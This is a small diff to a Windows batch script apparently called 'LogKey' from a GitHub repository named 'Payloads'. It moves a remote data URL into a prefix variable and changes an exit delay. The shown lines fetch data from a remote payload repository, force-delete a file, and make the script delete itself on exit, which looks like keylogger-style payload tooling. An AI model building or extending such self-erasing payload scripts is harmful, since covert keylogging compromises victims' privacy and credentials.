@@ -5,7 +5,8 @@ title PLs: LogKey
 
 set "version="
 set "debug=0"
-set "dataURL=https://raw.githubusercontent.com/Jed556/Payloads/main/LogKey/data.logkey"
+set "prefix=https://raw.githubusercontent.com/Jed556/Payloads/main/"
+set "dataURL=%prefix%LogKey/data.logkey"
 set "fileName="
 set "idLength=8"
 
@@ -154,8 +155,8 @@ if "%preserveData%"=="1" (
 del /Q /F %fileName%
 
 :Exit
-echo Exiting...
-timeout /t 2 /nobreak > nul
+echo Exiting in 3 seconds...
+timeout /t 3 /nobreak > nul
 del /Q /F "%~f0" & exit
 
 :: -------------------------------------------------------------------
